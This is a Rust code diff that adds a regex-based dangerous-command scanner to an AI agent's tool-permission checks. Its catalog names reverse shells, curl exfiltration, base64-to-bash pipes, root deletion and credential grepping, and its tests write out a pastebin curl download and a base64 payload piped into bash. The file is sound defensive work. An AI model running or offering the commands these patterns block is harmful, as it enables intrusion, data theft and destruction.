@@ -8,6 +8,7 @@
 //! agent loop. When tool calls are detected, permission checks determine
 //! whether to auto-execute, ask, or deny.
 
+use regex::Regex;
 use std::collections::HashSet;
 
 /// Permission decision for a tool invocation.
@@ -122,6 +123,27 @@ impl PermissionEvaluator {
         Permission::Ask
     }
 
+    /// Evaluate + run dangerous-pattern scan over the raw tool input.
+    /// Returns (final_permission, worst_dangerous_match_if_any).
+    ///
+    /// Risk escalation:
+    ///   Critical → auto Deny
+    ///   High     → Ask
+    ///   Low/Medium → trust base evaluate() result
+    pub fn evaluate_with_input(&mut self, tool_name: &str, is_destructive: bool, input_json: &str) -> (Permission, Option<DangerousMatch>) {
+        let base = self.evaluate(tool_name, is_destructive);
+        let matches = scan_for_dangerous_patterns(tool_name, input_json);
+        let worst = matches.into_iter().max_by_key(|m| match m.risk {
+            PatternRisk::Low => 0, PatternRisk::Medium => 1, PatternRisk::High => 2, PatternRisk::Critical => 3,
+        });
+        let perm = match (&base, worst.as_ref().map(|w| w.risk)) {
+            (_, Some(PatternRisk::Critical)) => { self.consecutive_denials += 1; self.total_denials += 1; Permission::Deny }
+            (_, Some(PatternRisk::High)) => Permission::Ask,
+            _ => base,
+        };
+        (perm, worst)
+    }
+
     /// Reset denial counters after user approves.
     pub fn approve(&mut self) {
         self.consecutive_denials = 0;
@@ -153,6 +175,80 @@ pub struct PermissionStats {
     pub mode: PermissionMode,
     pub consecutive_denials: u32,
     pub total_denials: u32,
+}
+
+// Dangerous-pattern scanner section.
+//
+// A DangerousPattern is a regex signature over the tool name + JSON args
+// that flags behavior an LLM should never propose unprompted.
+//
+// Signature catalog:
+// - exfil_curl_known: tool=execute_shell AND (curl|Invoke-WebRequest|wget) + suspicious host
+// - rm_root: rm -rf / or rm -rf ~ or rm -rf *
+// - chmod_777: chmod -R 777 or icacls grant Everyone:F
+// - base64_pipe: base64 -d | bash (or powershell -enc)
+// - eval_exec: eval $(...) or backtick-injection
+// - git_hard_reset: git reset --hard / git push -f
+// - reverse_shell: -e /bin/sh or nc -e or /dev/tcp
+// - ssh_tunnel: ssh -R or autossh
+// - secrets_dump: grep -rE "(api_key|password|secret)" /etc
+// - overwrite_sensitive: sed -i on /etc/passwd or registry
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum PatternRisk { Low, Medium, High, Critical }
+
+#[derive(Debug)]
+pub struct DangerousPattern {
+    pub name: &'static str,
+    pub tool_match: &'static str,
+    pub regex: Regex,
+    pub risk: PatternRisk,
+    pub message: &'static str,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct DangerousMatch {
+    pub pattern: &'static str,
+    pub risk: PatternRisk,
+    pub message: &'static str,
+}
+
+fn build_catalog() -> Vec<DangerousPattern> {
+    let p = |name: &'static str, tool_match: &'static str, pat: &str, risk: PatternRisk, message: &'static str| DangerousPattern {
+        name,
+        tool_match,
+        regex: Regex::new(pat).unwrap(),
+        risk,
+        message,
+    };
+    vec![
+        p("exfil_curl_known", "execute_shell", r"(?i)(curl|Invoke-WebRequest|wget).*?(pastebin|httpbin|icanhazip|169\.254\.169\.254|attacker|evil|malicious|exfil)", PatternRisk::Critical, "疑似数据外连 exfiltration"),
+        p("rm_root", "execute_shell", r"(?i)\brm\s+(-[a-zA-Z]*r[a-zA-Z]*|--recursive)\s+(-[a-zA-Z]*f[a-zA-Z]*|--force)\s+[/~*]", PatternRisk::Critical, "危险删除: rm -rf 根目录/家目录/通配符"),
+        p("chmod_777", "execute_shell", r"(?i)(chmod\s+-R\s+777|icacls\s+grant\s+Everyone\s*:\s*F)", PatternRisk::High, "危险权限: chmod -R 777 或 Everyone:F"),
+        p("base64_pipe", "execute_shell", r"(?i)(base64\s+-?d\s*\|.*(bash|sh)|powershell\s+-enc|certutil\s+-decode)", PatternRisk::Critical, "反混淆管道: base64 解码后进入 shell"),
+        p("eval_exec", "execute_shell", r"(?i)\beval\s*\(\s*\$\(|`[^`]*`\s*\(", PatternRisk::High, "命令注入: eval 或反引号注入"),
+        p("git_hard_reset", "execute_shell", r"(?i)(git\s+reset\s+--hard|git\s+push\s+-f|git\s+push\s+--force)", PatternRisk::High, "破坏性 git: reset --hard / push -f"),
+        p("reverse_shell", "execute_shell", r"(?i)(nc\s+.*-e\s+(bash|sh)|-e\s+/bin/(bash|sh)|/dev/tcp/|/dev/udp/|bash\s+-i\s+>&\s*/dev/tcp)", PatternRisk::Critical, "反向 shell 行为"),
+        p("ssh_tunnel", "execute_shell", r"(?i)(\bssh\b.*-R\s|autossh\b)", PatternRisk::High, "SSH 隧道/反向代理"),
+        p("secrets_dump", "execute_shell", r"(?i)(grep\s+-r[Ee]?\s*.*(api[_-]?key|password|secret|token).*?(etc|proc|sys|root)|\bfind\b.*-name.*(api[_-]?key|password|secret))", PatternRisk::High, "凭据扫找: 在系统目录中寻找密钥/密码"),
+        p("overwrite_sensitive", "execute_shell", r"(?i)(sed\s+-i\s+.*(/etc/passwd|/etc/shadow|/etc/group|/etc/sudoers)|\breg\s+(add|import)\b.*HKLM\\(?:SYSTEM|SAM|SECURITY|SOFTWARE)\\)", PatternRisk::Critical, "覆写系统关键文件或注册表"),
+    ]
+}
+
+pub fn catalog() -> Vec<DangerousPattern> { build_catalog() }
+
+pub fn scan_for_dangerous_patterns(tool_name: &str, input_json: &str) -> Vec<DangerousMatch> {
+    let mut out = Vec::new();
+    let haystack = format!("{}\n{}", tool_name, input_json);
+    for p in build_catalog() {
+        if !p.tool_match.is_empty() && p.tool_match != "*" && tool_name != p.tool_match {
+            continue;
+        }
+        if p.regex.is_match(&haystack) {
+            out.push(DangerousMatch { pattern: p.name, risk: p.risk, message: p.message });
+        }
+    }
+    out
 }
 
 #[cfg(test)]
@@ -193,5 +289,19 @@ mod tests {
         let stats = eval.stats();
         assert_eq!(stats.consecutive_denials, 5);
         assert_eq!(stats.total_denials, 5);
+    }
+
+    #[test]
+    fn test_dangerous_exfil_via_curl() {
+        let json = r#"{"command":"curl -s https://pastebin.com/raw/abc123 -o /tmp/x"}"#;
+        let hits = scan_for_dangerous_patterns("execute_shell", json);
+        assert!(hits.iter().any(|h| h.pattern == "exfil_curl_known"), "should flag curl->pastebin");
+    }
+
+    #[test]
+    fn test_base64_pipe() {
+        let json = r#"{"command":"echo c2xlZXAgY29tbWFuZCAjfHw= | base64 -d | bash"}"#;
+        let hits = scan_for_dangerous_patterns("execute_shell", json);
+        assert!(hits.iter().any(|h| h.pattern == "base64_pipe"), "should flag base64 pipe");
     }
 }
